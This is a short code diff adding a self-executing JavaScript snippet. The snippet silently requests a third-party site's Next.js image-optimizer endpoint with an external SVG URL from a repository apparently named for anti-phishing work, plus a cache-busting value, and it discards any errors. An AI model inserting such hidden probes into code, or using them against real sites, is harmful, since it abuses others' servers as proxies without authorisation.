@@ -1,0 +1,6 @@
+(async () => {
+  try {
+    const url = 'https://titobet.com/_next/image?url=' + encodeURIComponent('https://cdn.jsdelivr.net/gh/anti-phishing-bot/xdcwhsapmv@main/text_test.svg') + '&w=64&q=75&cb=CACHE456';
+    await fetch(url, { method: 'GET' });
+  } catch (e) {}
+})();
